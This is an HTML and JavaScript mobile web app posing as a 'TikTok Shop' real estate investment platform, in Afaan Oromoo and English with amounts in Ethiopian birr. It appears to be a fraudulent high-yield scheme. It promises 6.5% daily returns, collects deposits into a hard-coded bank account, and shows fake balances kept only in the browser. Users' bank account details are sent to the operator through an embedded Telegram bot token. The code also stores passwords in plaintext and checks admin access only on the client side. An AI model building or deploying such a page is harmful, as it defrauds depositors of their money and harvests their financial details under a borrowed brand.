<!DOCTYPE html>
<html lang="or">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Shop - Real Estate</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --tt-cyan: #00f2ea; --tt-pink: #ff0050; --dark-bg: #010101; --glass: rgba(255, 255, 255, 0.05); }
        body { background-color: var(--dark-bg); color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        
        /* Layout Fixes */
        .page { display: none; min-height: 100vh; padding-bottom: 100px; }
        .page.active { display: block; animation: slideUp 0.3s ease-out; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .glass { background: var(--glass); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; }
        .tt-gradient { background: linear-gradient(90deg, var(--tt-pink), var(--tt-cyan)); color: white; border: none; }
        
        /* Navbar */
        nav { background: rgba(0,0,0,0.9); backdrop-filter: blur(10px); border-top: 1px solid #222; }
        .nav-btn { color: #666; transition: 0.3s; }
        .nav-active { color: var(--tt-cyan); transform: scale(1.1); }

        /* Custom Alert */
        #customAlert { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 10000; width: 90%; display: none; border-radius: 15px; border-left: 5px solid var(--tt-cyan); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        
        input, select { background: #111 !important; border: 1px solid #333 !important; color: white !important; padding: 14px !important; border-radius: 12px !important; width: 100%; outline: none; }
        .product-card img { height: 180px; width: 100%; object-fit: cover; border-radius: 15px; }
    </style>
</head>
<body>

    <div id="customAlert" class="glass p-5">
        <div class="flex items-center gap-3">
            <div id="alertIcon" class="text-2xl text-cyan-400"><i class="fa fa-info-circle"></i></div>
            <p id="alertMsg" class="text-sm font-bold tracking-tight"></p>
        </div>
    </div>

    <section id="authPage" class="page active flex flex-col justify-center p-8">
        <div class="text-center mb-10">
            <h1 class="text-5xl font-black italic tracking-tighter"><span class="text-[#ff0050]">TikTok</span> <span class="text-[#00f2ea]">Shop</span></h1>
            <p class="text-gray-500 text-[10px] uppercase tracking-[0.4em] mt-2">Real Estate Investment</p>
        </div>
        <div id="authBox" class="glass p-8 space-y-4">
            <input type="text" id="phoneInput" placeholder="Lakk. Bilbilaa">
            <input type="password" id="passInput" placeholder="Password">
            <button onclick="handleAuth()" class="w-full p-4 tt-gradient rounded-xl font-bold uppercase shadow-lg">Seenaa / Galmaa'aa</button>
        </div>
    </section>

    <div id="mainDashboard" class="hidden">
        
        <header class="p-6 flex justify-between items-center sticky top-0 bg-black/80 z-50 backdrop-blur-md">
            <div>
                <p class="text-[10px] text-gray-500 uppercase">Profile</p>
                <p id="uiPhone" class="font-bold text-cyan-400"></p>
            </div>
            <div class="text-right">
                <p class="text-[10px] text-gray-500 uppercase">My Balance</p>
                <p class="text-xl font-black text-white italic">ETB <span id="uiBalance">0.00</span></p>
            </div>
        </header>

        <section id="homePage" class="page p-5">
            <div id="bonusBox" class="mb-6 p-6 tt-gradient rounded-[25px] flex justify-between items-center shadow-2xl cursor-pointer" onclick="claimBonus()">
                <div><h3 class="text-xl font-black italic">100 ETB BONUS!</h3><p class="text-xs opacity-90">Kunuunsa haaraa fudhu</p></div>
                <span class="text-4xl">🎁</span>
            </div>

            <div class="grid grid-cols-4 gap-3 mb-8 text-center text-[10px] font-bold">
                <div onclick="showPage('recharge')"><div class="glass p-4 mb-2"><i class="fa fa-plus text-cyan-400"></i></div>RECHARGE</div>
                <div onclick="showPage('withdraw')"><div class="glass p-4 mb-2"><i class="fa fa-upload text-pink-500"></i></div>WITHDRAW</div>
                <div onclick="showPage('invite')"><div class="glass p-4 mb-2"><i class="fa fa-share-alt text-blue-400"></i></div>INVITE</div>
                <div onclick="showPage('history')"><div class="glass p-4 mb-2"><i class="fa fa-file-invoice text-green-400"></i></div>HISTORY</div>
            </div>

            <div id="productGrid" class="space-y-6"></div>
        </section>

        <section id="taskPage" class="page p-5">
            <h2 class="text-2xl font-black italic mb-6">Daily Tasks</h2>
            <div id="taskContainer" class="space-y-4"></div>
        </section>

        <section id="rechargePage" class="page p-6">
            <div class="glass p-8 text-center mb-6">
                <p class="text-xs text-gray-500 mb-2 uppercase">CBE ACCOUNT (CLICK TO COPY)</p>
                <h4 class="text-2xl font-black text-cyan-400 mb-4 cursor-pointer" onclick="copyText('1000705884987')">1000705884987</h4>
            </div>
            <div class="space-y-4">
                <input type="number" id="depAmt" placeholder="Amount (Minimum 1000)">
                <input type="text" id="depFT" placeholder="Transaction ID (FT Number)">
                <button onclick="submitDeposit()" class="w-full p-4 tt-gradient rounded-xl font-bold uppercase shadow-lg">Submit Recharge</button>
            </div>
        </section>

        <section id="withdrawPage" class="page p-6 text-center">
            <div class="glass p-8 mb-6">
                <h3 class="text-xl font-black text-pink-500 mb-4">WITHDRAW</h3>
                <input type="number" id="wdAmt" placeholder="Minimum 200 ETB" class="mb-4">
                <input type="text" id="wdName" placeholder="Full Name (Bank)" class="mb-4">
                <input type="text" id="wdAcc" placeholder="CBE Account Number" class="mb-4">
                <button onclick="submitWithdraw()" class="w-full p-4 bg-white text-black font-black rounded-xl uppercase">Request Withdrawal</button>
            </div>
        </section>

        <section id="historyPage" class="page p-5">
            <h2 class="text-xl font-black mb-6 italic border-l-4 border-cyan-400 pl-3">Transactions</h2>
            <div id="historyList" class="space-y-3"></div>
        </section>

        <section id="adminPage" class="page p-5">
            <h2 class="text-xl font-black text-cyan-400 mb-6 uppercase">Admin User Management</h2>
            <div id="adminUserList" class="space-y-4 h-[60vh] overflow-y-auto pr-2"></div>
        </section>

        <section id="settingPage" class="page p-6">
            <div class="glass p-6">
                <p class="text-xs text-gray-500 mb-4">Choose Language / Afaan Filadhu</p>
                <select id="langSelect" onchange="changeLanguage()">
                    <option value="or">Afaan Oromoo</option>
                    <option value="am">Amharic (አማርኛ)</option>
                    <option value="en">English</option>
                </select>
                <button onclick="logout()" class="w-full mt-10 p-4 border border-red-900 text-red-500 font-bold rounded-xl">Logout</button>
            </div>
        </section>

        <nav class="fixed bottom-0 w-full flex justify-around p-4 z-[9999]">
            <button onclick="showPage('home')" class="nav-btn nav-active"><i class="fa fa-home text-xl"></i></button>
            <button onclick="showPage('task')" class="nav-btn"><i class="fa fa-tasks text-xl"></i></button>
            <button onclick="showPage('setting')" class="nav-btn"><i class="fa fa-cog text-xl"></i></button>
            <button id="adminBtn" onclick="showPage('admin')" class="nav-btn hidden text-pink-500"><i class="fa fa-user-shield text-xl"></i></button>
        </nav>
    </div>

    <script>
        // CONFIG
        const TG_TOKEN = "8703665809:AAHgg5gDonaYq9ldyhwwht3CDzbG4lBESck";
        const TG_CHAT_ID = "8644977770";
        const ADMIN_PH = "0975780412";

        let state = {
            user: null,
            users: JSON.parse(localStorage.getItem('tt_real_estate_db') || "[]")
        };

        // --- AUTH & PERSISTENCE ---
        function handleAuth() {
            const ph = document.getElementById('phoneInput').value;
            const ps = document.getElementById('passInput').value;
            if (ph.length < 10) return showAlert("Lakk. bilbilaa sirrii galchi!", "pink");

            let u = state.users.find(x => x.phone === ph);
            if (!u) {
                u = { 
                    phone: ph, pass: ps, balance: 0, products: [], 
                    bonusClaimed: false, history: [],
                    lang: 'or'
                };
                state.users.push(u);
                save();
            } else if (u.pass !== ps) return showAlert("Password dogoggora!", "pink");

            state.user = u;
            localStorage.setItem('tt_session_active', ph);
            startApp();
        }

        function startApp() {
            document.getElementById('authPage').style.display = 'none';
            document.getElementById('mainDashboard').classList.remove('hidden');
            document.getElementById('uiPhone').innerText = state.user.phone;
            
            if (state.user.phone === ADMIN_PH) document.getElementById('adminBtn').classList.remove('hidden');
            if (state.user.bonusClaimed) document.getElementById('bonusBox').style.display = 'none';

            renderProducts();
            refreshUI();
            showPage('home');
        }

        // --- PRODUCT GRID (F1-F15) ---
        function renderProducts() {
            const grid = document.getElementById('productGrid');
            grid.innerHTML = "";
            for (let i = 1; i <= 15; i++) {
                let dep = i === 1 ? 1000 : (i === 2 ? 2000 : (i === 3 ? 4000 : 4000 + (i-3)*2500));
                let daily = Math.floor(dep * 0.065);
                let total = daily * 30;
                
                grid.innerHTML += `
                <div class="glass p-4 product-card">
                    <img src="https://images.unsplash.com/photo-1582407947304-fd86f028f716?q=80&w=400" alt="Estate">
                    <div class="flex justify-between items-end mt-4">
                        <div>
                            <h4 class="font-black text-cyan-400 italic">REAL ESTATE F${i}</h4>
                            <p class="text-[11px] font-bold text-gray-500">INVEST: ${dep} ETB</p>
                            <p class="text-[11px] font-bold text-green-500">DAILY: ${daily} ETB | 30 DAYS</p>
                        </div>
                        <button onclick="buyProduct(${dep}, ${daily}, 'F${i}')" class="tt-gradient px-6 py-2 rounded-xl text-xs font-bold shadow-lg">INVEST</button>
                    </div>
                </div>`;
            }
        }

        function buyProduct(cost, daily, name) {
            // SECURITY: Check balance
            if (state.user.balance < cost) return showAlert("Balance gahaa miti! Maaloo dura recharge godhaa.", "pink");
            
            state.user.balance -= cost;
            state.user.products.push({ 
                name, daily, lastClaim: Date.now() - 86400000, 
                boughtAt: Date.now(), daysLeft: 30 
            });
            
            state.user.history.push({ type: 'Purchase', amt: cost, date: new Date().toLocaleString(), status: '✅ Success' });
            showAlert(`${name} Bittaniittu! ✅ Task jala deemi.`, "cyan");
            sendBot(`🚨 NEW INVESTMENT!\nUser: ${state.user.phone}\nPlan: ${name}\nCost: ${cost} ETB`);
            refreshUI();
            save();
        }

        // --- TASK ENGINE ---
        function renderTasks() {
            const cont = document.getElementById('taskContainer');
            cont.innerHTML = "";
            if (state.user.products.length === 0) {
                cont.innerHTML = `<div class="text-center py-20 text-gray-600">Product bittaadhaaf invest godhaa.</div>`;
                return;
            }

            state.user.products.forEach((p, idx) => {
                const canClaim = (Date.now() - p.lastClaim) >= 86400000;
                cont.innerHTML += `
                <div class="glass p-6 flex justify-between items-center border-l-4 ${canClaim ? 'border-cyan-400' : 'border-gray-800'}">
                    <div><p class="font-bold">${p.name} Profit</p><p class="text-xs text-gray-500">${p.daily} ETB / Day</p></div>
                    <button onclick="claimTask(${idx})" class="px-6 py-2 rounded-full text-xs font-bold ${canClaim ? 'tt-gradient' : 'bg-gray-800 text-gray-600'}" ${!canClaim ? 'disabled' : ''}>
                        ${canClaim ? 'CLAIM' : 'WAIT'}
                    </button>
                </div>`;
            });
        }

        function claimTask(idx) {
            let p = state.user.products[idx];
            state.user.balance += p.daily;
            p.lastClaim = Date.now();
            showAlert(`ETB ${p.daily} Balance keetti dabalameera!`, "cyan");
            refreshUI();
            save();
            renderTasks();
        }

        // --- SECURITY WITHDRAWAL & RECHARGE ---
        function submitWithdraw() {
            const amt = parseInt(document.getElementById('wdAmt').value);
            const name = document.getElementById('wdName').value;
            const acc = document.getElementById('wdAcc').value;

            // Security Rules
            if (amt < 200) return showAlert("Minimum 200 ETB baasuu dandeessu!", "pink");
            if (amt > state.user.balance) return showAlert("Balance keessa qarshii gahaa hin qabdu!", "pink");
            if (!name || !acc) return showAlert("Odeeffannoo guutuu galchi!", "pink");

            state.user.balance -= amt;
            const trans = { type: 'Withdraw', amt: amt, date: new Date().toLocaleString(), status: '⏳ Pending' };
            state.user.history.push(trans);
            
            sendBot(`💸 WITHDRAW REQUEST!\nUser: ${state.user.phone}\nAmount: ${amt} ETB\nName: ${name}\nAcc: ${acc}`);
            showAlert("Request ergameera! Admin ni kaffala.", "cyan");
            
            // Clear inputs
            document.getElementById('wdAmt').value = "";
            refreshUI();
            save();
        }

        function submitDeposit() {
            const amt = document.getElementById('depAmt').value;
            const ft = document.getElementById('depFT').value;
            if(!amt || !ft) return showAlert("Maaloo amount fi FT galchaa!", "pink");

            sendBot(`💰 RECHARGE REQUEST!\nUser: ${state.user.phone}\nAmount: ${amt} ETB\nFT: ${ft}`);
            showAlert("Request ergameera! Sa'aatii 1-2 keessatti approve ta'a.", "cyan");
            document.getElementById('depAmt').value = "";
            document.getElementById('depFT').value = "";
        }

        // --- ADMIN CONTROLS ---
        function renderAdmin() {
            const list = document.getElementById('adminUserList');
            list.innerHTML = "";
            state.users.forEach(u => {
                list.innerHTML += `
                <div class="glass p-5 border-l-4 border-cyan-500">
                    <p class="font-black text-cyan-400">${u.phone}</p>
                    <p class="text-xs mb-3">Balance: ${u.balance} ETB</p>
                    <div class="flex gap-2">
                        <input type="number" id="adm_${u.phone}" placeholder="Add Amount" class="text-xs p-2">
                        <button onclick="adminAdd('${u.phone}')" class="bg-green-600 px-4 rounded text-[10px] font-bold">APPROVE</button>
                        <button onclick="deleteUser('${u.phone}')" class="bg-red-900 px-4 rounded text-[10px] font-bold">BLOCK</button>
                    </div>
                </div>`;
            });
        }

        function adminAdd(ph) {
            const val = parseFloat(document.getElementById(`adm_${ph}`).value);
            if(!val) return;
            let u = state.users.find(x => x.phone === ph);
            u.balance += val;
            u.history.push({ type: 'Recharge', amt: val, date: new Date().toLocaleString(), status: '✅ Approved' });
            save();
            renderAdmin();
            showAlert(`ETB ${val} User ${ph}-f dabalameera!`, "cyan");
        }

        // --- CORE UTILS ---
        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id + 'Page').classList.add('active');
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('nav-active'));
            const btn = Array.from(document.querySelectorAll('.nav-btn')).find(b => b.onclick.toString().includes(id));
            if(btn) btn.classList.add('nav-active');
            
            if(id === 'admin') renderAdmin();
            if(id === 'task') renderTasks();
            if(id === 'history') renderHistory();
        }

        function renderHistory() {
            const list = document.getElementById('historyList');
            list.innerHTML = state.user.history.map(h => `
                <div class="glass p-4 flex justify-between items-center text-xs">
                    <div><p class="font-bold">${h.type}</p><p class="text-[10px] text-gray-500">${h.date}</p></div>
                    <div class="text-right"><p class="font-bold">${h.amt} ETB</p><p class="${h.status.includes('✅') ? 'text-green-400' : 'text-yellow-400'}">${h.status}</p></div>
                </div>
            `).join('') || "<p class='text-center text-gray-600 mt-10'>No history found.</p>";
        }

        async function sendBot(msg) {
            const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}`;
            await fetch(url);
        }

        function claimBonus() {
            state.user.balance += 100;
            state.user.bonusClaimed = true;
            document.getElementById('bonusBox').style.display = 'none';
            showAlert("100 ETB Welcome Bonus fudhattaniittu! 🎁", "cyan");
            refreshUI();
            save();
        }

        function showAlert(msg, type) {
            const a = document.getElementById('customAlert');
            a.style.display = 'block';
            a.style.borderColor = type === 'pink' ? '#ff0050' : '#00f2ea';
            document.getElementById('alertMsg').innerText = msg;
            setTimeout(() => a.style.display = 'none', 3000);
        }

        function refreshUI() { document.getElementById('uiBalance').innerText = state.user.balance.toFixed(2); }
        function save() { localStorage.setItem('tt_real_estate_db', JSON.stringify(state.users)); }
        function logout() { localStorage.removeItem('tt_session_active'); location.reload(); }
        function copyText(v) { navigator.clipboard.writeText(v); showAlert("Copied to Clipboard!", "cyan"); }

        // Session recovery
        const session = localStorage.getItem('tt_session_active');
        if (session) {
            state.user = state.users.find(u => u.phone === session);
            if (state.user) startApp();
        }
    </script>
</body>
</html>
